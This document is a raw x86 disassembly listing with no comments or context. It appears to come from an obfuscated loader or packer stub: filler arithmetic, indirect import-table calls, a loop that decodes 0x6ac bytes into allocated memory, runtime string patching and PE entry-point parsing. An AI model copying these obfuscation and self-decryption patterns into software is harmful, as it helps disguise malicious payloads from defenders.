  4d079f:	push   DWORD PTR [edx+0x88]
  4d07a5:	push   ebx
  4d07a6:	call   0x4d0a98
  4d07ab:	add    esp,0xc
  4d07ae:	pop    edx
  4d07af:	push   edx
  4d07b0:	push   0x0
  4d07b2:	call   0x4d15e4
  4d07b7:	add    esp,0x4
  4d07ba:	pop    edx
  4d07bb:	add    esp,0x38
  4d07be:	pop    ebp
  4d07bf:	ret    
  4d07c0:	mov    edi,edi
  4d07c2:	push   ebp
  4d07c3:	mov    ebp,esp
  4d07c5:	sub    esp,0x2c
  4d07c8:	lea    esi,ds:0x4d3148
  4d07ce:	add    edx,0x3c
  4d07d1:	push   0xfffffff4
  4d07d3:	call   0x4d13c4
  4d07d8:	add    esp,0x4
  4d07db:	push   esi
  4d07dc:	push   DWORD PTR [esi+0x4]
  4d07df:	push   eax
  4d07e0:	push   DWORD PTR [esi+0x1c0]
  4d07e6:	call   0x4d0778
  4d07eb:	add    esp,0xc
  4d07ee:	pop    esi
  4d07ef:	mov    edi,0x4d2040
  4d07f4:	mov    edi,DWORD PTR [edi]
  4d07f6:	push   edi
  4d07f7:	push   DWORD PTR [esi-0x130]
  4d07fd:	pop    ebx
  4d07fe:	call   ebx
  4d0800:	add    esp,0x2c
  4d0803:	pop    ebp
  4d0804:	ret    
  4d0805:	add    BYTE PTR [eax],al
  4d0807:	add    BYTE PTR [edi-0x1],bl
  4d080a:	adc    eax,0x4d208c
  4d080f:	call   edi
  4d0811:	add    BYTE PTR [eax],al
  4d0813:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0819:	sub    esp,0x24
  4d081c:	lea    edi,ds:0x4d3148
  4d0822:	xor    esi,0x7f3b
  4d0828:	push   edi
  4d0829:	push   ecx
  4d082a:	push   edx
  4d082b:	call   0x4d155c
  4d0830:	add    esp,0x8
  4d0833:	pop    edi
  4d0834:	push   edi
  4d0835:	mov    eax,0x0
  4d083a:	push   eax
  4d083b:	call   0x4d0b2c
  4d0840:	add    esp,0x4
  4d0843:	pop    edi
  4d0844:	push   edi
  4d0845:	call   0x4d09bc
  4d084a:	add    esp,0x4
  4d084d:	pop    edi
  4d084e:	add    esp,0x24
  4d0851:	pop    ebp
  4d0852:	ret    
  4d0853:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0859:	sub    esp,0x38
  4d085c:	mov    ecx,0x4d31b4
  4d0861:	and    eax,DWORD PTR [ebp-0x2c]
  4d0864:	push   ecx
  4d0865:	call   0x4d14f8
  4d086a:	add    esp,0x4
  4d086d:	pop    ecx
  4d086e:	push   ecx
  4d086f:	push   edx
  4d0870:	push   esi
  4d0871:	call   0x4d12dc
  4d0876:	add    esp,0x8
  4d0879:	pop    ecx
  4d087a:	push   ecx
  4d087b:	mov    edi,0x0
  4d0880:	push   edi
  4d0881:	call   0x4d0b2c
  4d0886:	add    esp,0x4
  4d0889:	pop    ecx
  4d088a:	add    esp,0x38
  4d088d:	pop    ebp
  4d088e:	ret    
  4d088f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0895:	sub    esp,0x60
  4d0898:	cmp    edi,0x9e1
  4d089e:	jb     0x4d0893
  4d08a0:	lea    eax,ds:0x4d3170
  4d08a6:	push   eax
  4d08a7:	push   0x6ac
  4d08ac:	push   0x6ac
  4d08b1:	push   0x40001
  4d08b6:	mov    edx,0x862985c2
  4d08bb:	push   DWORD PTR [edx+0x7a239a86]
  4d08c1:	sub    DWORD PTR [esp],0x2
  4d08c5:	mov    edx,0x4d2014
  4d08ca:	pop    DWORD PTR [edx]
  4d08cc:	call   0x4d13e8
  4d08d1:	add    esp,0x4
  4d08d4:	xchg   DWORD PTR [esp],eax
  4d08d7:	pop    DWORD PTR [eax-0x158]
  4d08dd:	mov    edi,DWORD PTR [eax-0x158]
  4d08e3:	lea    edi,[edi]
  4d08e5:	sub    edx,edx
  4d08e7:	dec    edx
  4d08e8:	and    edx,0x4d0014
  4d08ee:	mov    esi,0xd5d9a824
  4d08f3:	xor    ecx,ecx
  4d08f5:	cmp    ecx,0x6ac
  4d08fb:	je     0x4d0919
  4d08fd:	sub    ecx,0xfffffffc
  4d0900:	xor    ebx,ebx
  4d0902:	push   DWORD PTR [edx+ebx*1]
  4d0905:	add    DWORD PTR [esp],esi
  4d0908:	pop    DWORD PTR [edi+ebx*2]
  4d090b:	dec    DWORD PTR [edi]
  4d090d:	xor    esi,esi
  4d090f:	add    esi,DWORD PTR [edx]
  4d0911:	add    edx,0x4
  4d0914:	add    edi,0x4
  4d0917:	jmp    0x4d08f5
  4d0919:	push   eax
  4d091a:	call   0x4d09bc
  4d091f:	add    esp,0x4
  4d0922:	pop    eax
  4d0923:	add    esp,0x60
  4d0926:	pop    ebp
  4d0927:	ret    
  4d0928:	mov    edi,edi
  4d092a:	push   ebp
  4d092b:	mov    ebp,esp
  4d092d:	sub    esp,0x3c
  4d0930:	lea    esi,[edi+0x6c]
  4d0933:	mov    DWORD PTR [esi-0x30],0x4696
  4d093a:	push   0x0
  4d093c:	call   0x4d0c9c
  4d0941:	add    esp,0x4
  4d0944:	push   esi
  4d0945:	push   edx
  4d0946:	push   DWORD PTR [esi+0xac]
  4d094c:	push   DWORD PTR [esi+0x1b0]
  4d0952:	push   ecx
  4d0953:	call   0x4d1370
  4d0958:	add    esp,0x10
  4d095b:	pop    esi
  4d095c:	mov    eax,0x0
  4d0961:	push   eax
  4d0962:	call   0x4d0728
  4d0967:	add    esp,0x4
  4d096a:	add    esp,0x3c
  4d096d:	pop    ebp
  4d096e:	ret    
  4d096f:	add    BYTE PTR [edi-0x1],bl
  4d0972:	adc    eax,0x4d2080
  4d0977:	call   edi
  4d0979:	add    BYTE PTR [eax],al
  4d097b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0981:	sub    esp,0x50
  4d0984:	lea    ecx,ds:0x4d30a4
  4d098a:	mov    edx,ecx
  4d098c:	push   ecx
  4d098d:	mov    edx,0x0
  4d0992:	push   edx
  4d0993:	call   0x4d13d0
  4d0998:	add    esp,0x4
  4d099b:	pop    ecx
  4d099c:	push   ecx
  4d099d:	push   DWORD PTR [ecx+0x1a0]
  4d09a3:	push   eax
  4d09a4:	call   0x4d0814
  4d09a9:	add    esp,0x8
  4d09ac:	pop    ecx
  4d09ad:	push   ecx
  4d09ae:	call   0x4d09bc
  4d09b3:	add    esp,0x4
  4d09b6:	pop    ecx
  4d09b7:	add    esp,0x50
  4d09ba:	pop    ebp
  4d09bb:	ret    
  4d09bc:	pop    edi
  4d09bd:	call   DWORD PTR ds:0x4d201c
  4d09c3:	call   edi
  4d09c5:	add    BYTE PTR [eax],al
  4d09c7:	add    BYTE PTR [edi-0x1],bl
  4d09ca:	adc    eax,0x4d2088
  4d09cf:	call   edi
  4d09d1:	add    BYTE PTR [eax],al
  4d09d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09d9:	sub    esp,0x40
  4d09dc:	lea    eax,ds:0x4d31e0
  4d09e2:	cmp    eax,0x48ed
  4d09e7:	jbe    0x4d09d7
  4d09e9:	push   eax
  4d09ea:	mov    ebx,0x0
  4d09ef:	push   ebx
  4d09f0:	call   0x4d1028
  4d09f5:	add    esp,0x4
  4d09f8:	pop    eax
  4d09f9:	push   eax
  4d09fa:	push   DWORD PTR [eax+0x1ec]
  4d0a00:	push   DWORD PTR [eax+0xc4]
  4d0a06:	push   DWORD PTR [eax+0x15c]
  4d0a0c:	push   esi
  4d0a0d:	call   0x4d151c
  4d0a12:	add    esp,0x10
  4d0a15:	pop    eax
  4d0a16:	push   eax
  4d0a17:	push   0x0
  4d0a19:	call   0x4d1504
  4d0a1e:	add    esp,0x4
  4d0a21:	pop    eax
  4d0a22:	add    esp,0x40
  4d0a25:	pop    ebp
  4d0a26:	ret    
  4d0a27:	add    BYTE PTR [edi-0x1],bl
  4d0a2a:	adc    eax,0x4d2084
  4d0a2f:	call   edi
  4d0a31:	add    BYTE PTR [eax],al
  4d0a33:	add    BYTE PTR [edi-0x1],bl
  4d0a36:	adc    eax,0x4d2040
  4d0a3b:	call   edi
  4d0a3d:	add    BYTE PTR [eax],al
  4d0a3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a45:	sub    esp,0x48
  4d0a48:	lea    eax,[esi+0x20]
  4d0a4b:	and    DWORD PTR [eax-0xb4],ecx
  4d0a51:	push   eax
  4d0a52:	mov    ebx,0x0
  4d0a57:	push   ebx
  4d0a58:	call   0x4d101c
  4d0a5d:	add    esp,0x4
  4d0a60:	pop    eax
  4d0a61:	push   eax
  4d0a62:	push   ebx
  4d0a63:	push   DWORD PTR [eax+0x180]
  4d0a69:	push   DWORD PTR [eax+0x184]
  4d0a6f:	call   0x4d128c
  4d0a74:	add    esp,0xc
  4d0a77:	pop    eax
  4d0a78:	push   eax
  4d0a79:	push   0x0
  4d0a7b:	call   0x4d1028
  4d0a80:	add    esp,0x4
  4d0a83:	pop    eax
  4d0a84:	add    esp,0x48
  4d0a87:	pop    ebp
  4d0a88:	ret    
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [edi-0x1],bl
  4d0a8e:	adc    eax,0x4d2068
  4d0a93:	call   edi
  4d0a95:	add    BYTE PTR [eax],al
  4d0a97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a9d:	sub    esp,0x48
  4d0aa0:	lea    ecx,[edx-0x18]
  4d0aa3:	cmp    ecx,0x7f1
  4d0aa9:	jb     0x4d0a9b
  4d0aab:	push   ecx
  4d0aac:	push   DWORD PTR [ecx+0x1ac]
  4d0ab2:	push   DWORD PTR [ecx+0xcc]
  4d0ab8:	push   edi
  4d0ab9:	call   0x4d1228
  4d0abe:	add    esp,0xc
  4d0ac1:	pop    ecx
  4d0ac2:	push   ecx
  4d0ac3:	call   0x4d14e0
  4d0ac8:	add    esp,0x4
  4d0acb:	pop    ecx
  4d0acc:	push   ecx
  4d0acd:	push   0x0
  4d0acf:	call   0x4d1504
  4d0ad4:	add    esp,0x4
  4d0ad7:	pop    ecx
  4d0ad8:	add    esp,0x48
  4d0adb:	pop    ebp
  4d0adc:	ret    
  4d0add:	add    BYTE PTR [eax],al
  4d0adf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae5:	sub    esp,0x54
  4d0ae8:	lea    edi,[esi-0xd4]
  4d0aee:	sbb    eax,DWORD PTR [ebp-0x2c]
  4d0af1:	push   edi
  4d0af2:	push   0x0
  4d0af4:	call   0x4d0728
  4d0af9:	add    esp,0x4
  4d0afc:	pop    edi
  4d0afd:	push   edi
  4d0afe:	push   DWORD PTR [edi+0xbc]
  4d0b04:	push   DWORD PTR [edi+0xc4]
  4d0b0a:	push   DWORD PTR [edi+0x1a0]
  4d0b10:	push   esi
  4d0b11:	call   0x4d11d8
  4d0b16:	add    esp,0x10
  4d0b19:	pop    edi
  4d0b1a:	push   edi
  4d0b1b:	call   0x4d09bc
  4d0b20:	add    esp,0x4
  4d0b23:	pop    edi
  4d0b24:	add    esp,0x54
  4d0b27:	pop    ebp
  4d0b28:	ret    
  4d0b29:	add    BYTE PTR [eax],al
  4d0b2b:	add    BYTE PTR [edi-0x1],bl
  4d0b2e:	adc    eax,0x4d202c
  4d0b33:	call   edi
  4d0b35:	add    BYTE PTR [eax],al
  4d0b37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b3d:	sub    esp,0x40
  4d0b40:	lea    edx,ds:0x4d31b4
  4d0b46:	sbb    edi,DWORD PTR [ebp-0x34]
  4d0b49:	push   edx
  4d0b4a:	push   ecx
  4d0b4b:	push   DWORD PTR [edx+0x74]
  4d0b4e:	push   esi
  4d0b4f:	push   DWORD PTR [edx+0x1a0]
  4d0b55:	call   0x4d0854
  4d0b5a:	add    esp,0x10
  4d0b5d:	pop    edx
  4d0b5e:	push   edx
  4d0b5f:	mov    eax,0x0
  4d0b64:	push   eax
  4d0b65:	call   0x4d1028
  4d0b6a:	add    esp,0x4
  4d0b6d:	pop    edx
  4d0b6e:	push   edx
  4d0b6f:	mov    edi,0x0
  4d0b74:	push   edi
  4d0b75:	call   0x4d101c
  4d0b7a:	add    esp,0x4
  4d0b7d:	pop    edx
  4d0b7e:	add    esp,0x40
  4d0b81:	pop    ebp
  4d0b82:	ret    
  4d0b83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b89:	sub    esp,0x60
  4d0b8c:	lea    eax,ds:0x4d3010
  4d0b92:	sub    DWORD PTR [ebp-0x30],esi
  4d0b95:	push   eax
  4d0b96:	push   DWORD PTR [eax+0x1c4]
  4d0b9c:	push   DWORD PTR [eax+0x174]
  4d0ba2:	push   DWORD PTR [eax+0x18]
  4d0ba5:	push   edi
  4d0ba6:	call   0x4d113c
  4d0bab:	add    esp,0x10
  4d0bae:	pop    eax
  4d0baf:	push   eax
  4d0bb0:	mov    edx,0x0
  4d0bb5:	push   edx
  4d0bb6:	call   0x4d0c9c
  4d0bbb:	add    esp,0x4
  4d0bbe:	pop    eax
  4d0bbf:	push   eax
  4d0bc0:	mov    eax,0x0
  4d0bc5:	push   eax
  4d0bc6:	call   0x4d15e4
  4d0bcb:	add    esp,0x4
  4d0bce:	pop    eax
  4d0bcf:	add    esp,0x60
  4d0bd2:	pop    ebp
  4d0bd3:	ret    
  4d0bd4:	mov    edi,edi
  4d0bd6:	push   ebp
  4d0bd7:	mov    ebp,esp
  4d0bd9:	sub    esp,0x28
  4d0bdc:	lea    eax,ds:0x4d301c
  4d0be2:	add    DWORD PTR [ebp-0x8],0xffffda96
  4d0be9:	push   eax
  4d0bea:	push   DWORD PTR [eax+0x160]
  4d0bf0:	push   DWORD PTR [eax+0x154]
  4d0bf6:	push   DWORD PTR [eax+0x168]
  4d0bfc:	push   DWORD PTR [eax+0xb0]
  4d0c02:	call   0x4d0ca8
  4d0c07:	add    esp,0x10
  4d0c0a:	pop    eax
  4d0c0b:	push   eax
  4d0c0c:	mov    eax,0x0
  4d0c11:	push   eax
  4d0c12:	call   0x4d0728
  4d0c17:	add    esp,0x4
  4d0c1a:	pop    eax
  4d0c1b:	push   eax
  4d0c1c:	push   0x0
  4d0c1e:	call   0x4d0c9c
  4d0c23:	add    esp,0x4
  4d0c26:	pop    eax
  4d0c27:	add    esp,0x28
  4d0c2a:	pop    ebp
  4d0c2b:	ret    
  4d0c2c:	pop    edi
  4d0c2d:	call   DWORD PTR ds:0x4d206c
  4d0c33:	call   edi
  4d0c35:	add    BYTE PTR [eax],al
  4d0c37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c3d:	sub    esp,0x5c
  4d0c40:	lea    ecx,[eax+0x10]
  4d0c43:	sub    DWORD PTR [ecx-0x124],0xffffa2a9
  4d0c4d:	push   ecx
  4d0c4e:	push   0x0
  4d0c50:	call   0x4d15e4
  4d0c55:	add    esp,0x4
  4d0c58:	pop    ecx
  4d0c59:	push   ecx
  4d0c5a:	push   DWORD PTR [ecx+0x1e4]
  4d0c60:	push   DWORD PTR [ecx+0x198]
  4d0c66:	push   DWORD PTR [ecx+0x110]
  4d0c6c:	push   DWORD PTR [ecx+0xb8]
  4d0c72:	call   0x4d1188
  4d0c77:	add    esp,0x10
  4d0c7a:	pop    ecx
  4d0c7b:	push   ecx
  4d0c7c:	mov    ecx,0x0
  4d0c81:	push   ecx
  4d0c82:	call   0x4d101c
  4d0c87:	add    esp,0x4
  4d0c8a:	pop    ecx
  4d0c8b:	add    esp,0x5c
  4d0c8e:	pop    ebp
  4d0c8f:	ret    
  4d0c90:	pop    edi
  4d0c91:	call   DWORD PTR ds:0x4d204c
  4d0c97:	call   edi
  4d0c99:	add    BYTE PTR [eax],al
  4d0c9b:	add    BYTE PTR [edi-0x1],bl
  4d0c9e:	adc    eax,0x4d2004
  4d0ca3:	call   edi
  4d0ca5:	add    BYTE PTR [eax],al
  4d0ca7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cad:	sub    esp,0x5c
  4d0cb0:	lea    edi,[eax+0x58]
  4d0cb3:	xor    DWORD PTR [ebp-0x48],edi
  4d0cb6:	push   edi
  4d0cb7:	push   DWORD PTR [edi+0x7c]
  4d0cba:	push   DWORD PTR [edi+0xb0]
  4d0cc0:	push   ecx
  4d0cc1:	call   0x4d097c
  4d0cc6:	add    esp,0xc
  4d0cc9:	pop    edi
  4d0cca:	push   edi
  4d0ccb:	lea    edi,[edi-0x74]
  4d0cce:	push   edi
  4d0ccf:	call   0x4d0a34
  4d0cd4:	add    esp,0x4
  4d0cd7:	test   eax,eax
  4d0cd9:	jne    0x4d0ccb
  4d0cdb:	pop    edi
  4d0cdc:	push   edi
  4d0cdd:	push   0x0
  4d0cdf:	call   0x4d1400
  4d0ce4:	add    esp,0x4
  4d0ce7:	pop    edi
  4d0ce8:	add    esp,0x5c
  4d0ceb:	pop    ebp
  4d0cec:	ret    
  4d0ced:	add    BYTE PTR [eax],al
  4d0cef:	add    BYTE PTR [edi+0x2b],dl
  4d0cf2:	call   DWORD PTR [edi+0x57]
  4d0cf5:	push   edi
  4d0cf6:	push   edi
  4d0cf7:	call   0x4d09bc
  4d0cfc:	sub    esp,0xfffffffc
  4d0cff:	call   0x4d0e58
  4d0d04:	push   0x2
  4d0d06:	xor    eax,eax
  4d0d08:	dec    eax
  4d0d09:	and    eax,0x4d3030
  4d0d0e:	push   0x0
  4d0d10:	lea    ecx,[eax+0x6]
  4d0d13:	add    BYTE PTR [ecx],0x41
  4d0d16:	push   eax
  4d0d17:	call   0x4d13e8
  4d0d1c:	pop    edi
  4d0d1d:	pop    edi
  4d0d1e:	pop    edi
  4d0d1f:	lea    edi,[eax+0x3b]
  4d0d22:	mov    edi,DWORD PTR [edi]
  4d0d24:	lea    eax,[eax+edi*1]
  4d0d27:	mov    eax,DWORD PTR [eax+0x28]
  4d0d2a:	pusha  
  4d0d2b:	mov    ah,0x45
  4d0d2d:	sub    al,ah
  4d0d2f:	ja     0x4d07c0
  4d0d35:	popa   
  4d0d36:	ret    
  4d0d37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d3d:	sub    esp,0x48
  4d0d40:	mov    esi,0x4d3198
  4d0d45:	and    DWORD PTR [ebp-0x24],0xffffe69e
  4d0d4c:	push   esi
  4d0d4d:	push   DWORD PTR [esi+0x68]
  4d0d50:	push   eax
  4d0d51:	push   eax
  4d0d52:	call   0x4d0ec0
  4d0d57:	add    esp,0xc
  4d0d5a:	pop    esi
  4d0d5b:	push   0xfffffff4
  4d0d5d:	call   0x4d13c4
  4d0d62:	add    esp,0x4
  4d0d65:	push   0x0
  4d0d67:	call   0x4d1130
  4d0d6c:	add    esp,0x4
  4d0d6f:	add    esp,0x48
  4d0d72:	pop    ebp
  4d0d73:	ret    
  4d0d74:	mov    edi,edi
  4d0d76:	push   ebp
  4d0d77:	mov    ebp,esp
  4d0d79:	sub    esp,0x44
  4d0d7c:	mov    edi,0x4d3014
  4d0d81:	sbb    DWORD PTR [edi+0x174],0x584c
  4d0d8b:	push   edi
  4d0d8c:	lea    esi,[edi-0x14]
  4d0d8f:	push   esi
  4d0d90:	call   0x4d0a34
  4d0d95:	add    esp,0x4
  4d0d98:	test   eax,eax
  4d0d9a:	jne    0x4d0d8c
  4d0d9c:	pop    edi
  4d0d9d:	push   edi
  4d0d9e:	push   edx
  4d0d9f:	push   eax
  4d0da0:	call   0x4d0f94
  4d0da5:	add    esp,0x8
  4d0da8:	pop    edi
  4d0da9:	push   edi
  4d0daa:	mov    edi,0x0
  4d0daf:	push   edi
  4d0db0:	call   0x4d15e4
  4d0db5:	add    esp,0x4
  4d0db8:	pop    edi
  4d0db9:	add    esp,0x44
  4d0dbc:	pop    ebp
  4d0dbd:	ret    
  4d0dbe:	add    BYTE PTR [eax],al
  4d0dc0:	pop    edi
  4d0dc1:	call   DWORD PTR ds:0x4d2060
  4d0dc7:	call   edi
  4d0dc9:	add    BYTE PTR [eax],al
  4d0dcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dd1:	sub    esp,0x4c
  4d0dd4:	lea    ebx,[esi+0x68]
  4d0dd7:	sbb    esi,DWORD PTR [ebx+0xb0]
  4d0ddd:	call   0x4d14f8
  4d0de2:	add    esp,0x4
  4d0de5:	push   ebx
  4d0de6:	push   esi
  4d0de7:	push   edi
  4d0de8:	push   DWORD PTR [ebx+0x78]
  4d0deb:	push   DWORD PTR [ebx+0x5c]
  4d0dee:	call   0x4d144c
  4d0df3:	add    esp,0x10
  4d0df6:	pop    ebx
  4d0df7:	push   0x0
  4d0df9:	call   0x4d1028
  4d0dfe:	add    esp,0x4
  4d0e01:	add    esp,0x4c
  4d0e04:	pop    ebp
  4d0e05:	ret    
  4d0e06:	add    BYTE PTR [eax],al
  4d0e08:	mov    edi,edi
  4d0e0a:	push   ebp
  4d0e0b:	mov    ebp,esp
  4d0e0d:	sub    esp,0x30
  4d0e10:	mov    eax,0x4d31ac
  4d0e15:	xor    DWORD PTR [eax-0x184],0xffffd08a
  4d0e1f:	push   eax
  4d0e20:	call   0x4d09bc
  4d0e25:	add    esp,0x4
  4d0e28:	pop    eax
  4d0e29:	push   eax
  4d0e2a:	push   ecx
  4d0e2b:	push   edx
  4d0e2c:	call   0x4d0d38
  4d0e31:	add    esp,0x8
  4d0e34:	pop    eax
  4d0e35:	push   eax
  4d0e36:	mov    edi,0x0
  4d0e3b:	push   edi
  4d0e3c:	call   0x4d15e4
  4d0e41:	add    esp,0x4
  4d0e44:	pop    eax
  4d0e45:	add    esp,0x30
  4d0e48:	pop    ebp
  4d0e49:	ret    
  4d0e4a:	add    BYTE PTR [eax],al
  4d0e4c:	pop    edi
  4d0e4d:	call   DWORD PTR ds:0x4d20a0
  4d0e53:	call   edi
  4d0e55:	add    BYTE PTR [eax],al
  4d0e57:	add    BYTE PTR [edi-0x1],bl
  4d0e5a:	adc    eax,0x4d2030
  4d0e5f:	call   edi
  4d0e61:	add    BYTE PTR [eax],al
  4d0e63:	add    BYTE PTR [edi-0x1],bl
  4d0e66:	adc    eax,0x4d2090
  4d0e6b:	call   edi
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e75:	sub    esp,0x4c
  4d0e78:	lea    esi,[ebx+0x10]
  4d0e7b:	sub    ecx,DWORD PTR [ebp-0x10]
  4d0e7e:	push   esi
  4d0e7f:	push   DWORD PTR [esi+0x1dc]
  4d0e85:	push   edi
  4d0e86:	push   DWORD PTR [esi+0x1a4]
  4d0e8c:	call   0x4d0a40
  4d0e91:	add    esp,0xc
  4d0e94:	pop    esi
  4d0e95:	push   0x0
  4d0e97:	call   0x4d1130
  4d0e9c:	add    esp,0x4
  4d0e9f:	mov    ecx,0x0
  4d0ea4:	push   ecx
  4d0ea5:	call   0x4d15e4
  4d0eaa:	add    esp,0x4
  4d0ead:	add    esp,0x4c
  4d0eb0:	pop    ebp
  4d0eb1:	ret    
  4d0eb2:	add    BYTE PTR [eax],al
  4d0eb4:	pop    edi
  4d0eb5:	call   DWORD PTR ds:0x4d2020
  4d0ebb:	call   edi
  4d0ebd:	add    BYTE PTR [eax],al
  4d0ebf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ec5:	sub    esp,0x60
  4d0ec8:	lea    edi,ds:0x4d310c
  4d0ece:	and    ecx,DWORD PTR [edi-0x44]
  4d0ed1:	push   edi
  4d0ed2:	mov    esi,0xfffffff4
  4d0ed7:	push   esi
  4d0ed8:	call   0x4d13c4
  4d0edd:	add    esp,0x4
  4d0ee0:	pop    edi
  4d0ee1:	push   edi
  4d0ee2:	push   eax
  4d0ee3:	push   DWORD PTR [edi+0x1c8]
  4d0ee9:	push   DWORD PTR [edi+0x1e0]
  4d0eef:	push   DWORD PTR [edi+0x134]
  4d0ef5:	call   0x4d0890
  4d0efa:	add    esp,0x10
  4d0efd:	pop    edi
  4d0efe:	push   edi
  4d0eff:	call   0x4d14e0
  4d0f04:	add    esp,0x4
  4d0f07:	pop    edi
  4d0f08:	add    esp,0x60
  4d0f0b:	pop    ebp
  4d0f0c:	ret    
  4d0f0d:	add    BYTE PTR [eax],al
  4d0f0f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f15:	sub    esp,0x58
  4d0f18:	lea    esi,ds:0x4d3058
  4d0f1e:	xor    ecx,edx
  4d0f20:	push   0x0
  4d0f22:	call   0x4d0b2c
  4d0f27:	add    esp,0x4
  4d0f2a:	push   esi
  4d0f2b:	push   edx
  4d0f2c:	push   DWORD PTR [esi+0xb4]
  4d0f32:	call   0x4d0dcc
  4d0f37:	add    esp,0x8
  4d0f3a:	pop    esi
  4d0f3b:	lea    edi,[esi-0x58]
  4d0f3e:	push   edi
  4d0f3f:	call   0x4d0a34
  4d0f44:	add    esp,0x4
  4d0f47:	test   eax,eax
  4d0f49:	jne    0x4d0f3c
  4d0f4b:	add    esp,0x58
  4d0f4e:	pop    ebp
  4d0f4f:	ret    
  4d0f50:	mov    edi,edi
  4d0f52:	push   ebp
  4d0f53:	mov    ebp,esp
  4d0f55:	sub    esp,0x28
  4d0f58:	lea    esi,[ecx-0x124]
  4d0f5e:	xor    edi,ecx
  4d0f60:	push   esi
  4d0f61:	push   edx
  4d0f62:	push   ebx
  4d0f63:	call   0x4d0b84
  4d0f68:	add    esp,0x8
  4d0f6b:	pop    esi
  4d0f6c:	mov    edx,0xfffffff4
  4d0f71:	push   edx
  4d0f72:	call   0x4d13c4
  4d0f77:	add    esp,0x4
  4d0f7a:	call   0x4d14e0
  4d0f7f:	add    esp,0x4
  4d0f82:	add    esp,0x28
  4d0f85:	pop    ebp
  4d0f86:	ret    
  4d0f87:	add    BYTE PTR [edi-0x1],bl
  4d0f8a:	adc    eax,0x4d2094
  4d0f8f:	call   edi
  4d0f91:	add    BYTE PTR [eax],al
  4d0f93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f99:	sub    esp,0x38
  4d0f9c:	mov    edx,0x4d300c
  4d0fa1:	sub    DWORD PTR [edx+0x68],eax
  4d0fa4:	push   edx
  4d0fa5:	push   ecx
  4d0fa6:	push   DWORD PTR [edx+0x68]
  4d0fa9:	call   0x4d06ec
  4d0fae:	add    esp,0x8
  4d0fb1:	pop    edx
  4d0fb2:	push   edx
  4d0fb3:	push   0xfffffff4
  4d0fb5:	call   0x4d13c4
  4d0fba:	add    esp,0x4
  4d0fbd:	pop    edx
  4d0fbe:	push   edx
  4d0fbf:	call   0x4d14e0
  4d0fc4:	add    esp,0x4
  4d0fc7:	pop    edx
  4d0fc8:	add    esp,0x38
  4d0fcb:	pop    ebp
  4d0fcc:	ret    
  4d0fcd:	add    BYTE PTR [eax],al
  4d0fcf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fd5:	sub    esp,0x4c
  4d0fd8:	mov    ecx,0x4d3034
  4d0fdd:	cmp    ecx,0x1608
  4d0fe3:	jbe    0x4d0fd3
  4d0fe5:	push   ecx
  4d0fe6:	push   0x0
  4d0fe8:	call   0x4d1400
  4d0fed:	add    esp,0x4
  4d0ff0:	pop    ecx
  4d0ff1:	push   ecx
  4d0ff2:	push   DWORD PTR [ecx+0x120]
  4d0ff8:	push   esi
  4d0ff9:	push   DWORD PTR [ecx+0x5c]
  4d0ffc:	push   DWORD PTR [ecx+0x144]
  4d1002:	call   0x4d0e08
  4d1007:	add    esp,0x10
  4d100a:	pop    ecx
  4d100b:	push   ecx
  4d100c:	call   0x4d09bc
  4d1011:	add    esp,0x4
  4d1014:	pop    ecx
  4d1015:	add    esp,0x4c
  4d1018:	pop    ebp
  4d1019:	ret    
  4d101a:	add    BYTE PTR [eax],al
  4d101c:	pop    edi
  4d101d:	call   DWORD PTR ds:0x4d2058
  4d1023:	call   edi
  4d1025:	add    BYTE PTR [eax],al
  4d1027:	add    BYTE PTR [edi-0x1],bl
  4d102a:	adc    eax,0x4d2000
  4d102f:	call   edi
  4d1031:	add    BYTE PTR [eax],al
  4d1033:	add    BYTE PTR [edi-0x1],bl
  4d1036:	adc    eax,0x4d2078
  4d103b:	call   edi
  4d103d:	add    BYTE PTR [eax],al
  4d103f:	add    BYTE PTR [edi-0x1],bl
  4d1042:	adc    eax,0x4d207c
  4d1047:	call   edi
  4d1049:	add    BYTE PTR [eax],al
  4d104b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1051:	sub    esp,0x30
  4d1054:	lea    ebx,ds:0x4d3120
  4d105a:	and    DWORD PTR [ebp-0x18],0x59e3
  4d1061:	push   ebx
  4d1062:	push   eax
  4d1063:	push   DWORD PTR [ebx+0xa8]
  4d1069:	push   DWORD PTR [ebx+0x160]
  4d106f:	push   edx
  4d1070:	call   0x4d15a4
  4d1075:	add    esp,0x10
  4d1078:	pop    ebx
  4d1079:	call   0x4d09bc
  4d107e:	add    esp,0x4
  4d1081:	push   0xfffffff4
  4d1083:	call   0x4d13c4
  4d1088:	add    esp,0x4
  4d108b:	add    esp,0x30
  4d108e:	pop    ebp
  4d108f:	ret    
  4d1090:	mov    edi,edi
  4d1092:	push   ebp
  4d1093:	mov    ebp,esp
  4d1095:	sub    esp,0x40
  4d1098:	lea    ecx,ds:0x4d3158
  4d109e:	mov    eax,DWORD PTR [ecx-0xe8]
  4d10a4:	push   ecx
  4d10a5:	push   DWORD PTR [ecx+0x154]
  4d10ab:	push   edi
  4d10ac:	push   edx
  4d10ad:	push   DWORD PTR [ecx+0x6c]
  4d10b0:	call   0x4d0f50
  4d10b5:	add    esp,0x10
  4d10b8:	pop    ecx
  4d10b9:	push   ecx
  4d10ba:	mov    ecx,0x0
  4d10bf:	push   ecx
  4d10c0:	call   0x4d0c9c
  4d10c5:	add    esp,0x4
  4d10c8:	pop    ecx
  4d10c9:	push   ecx
  4d10ca:	call   0x4d14f8
  4d10cf:	add    esp,0x4
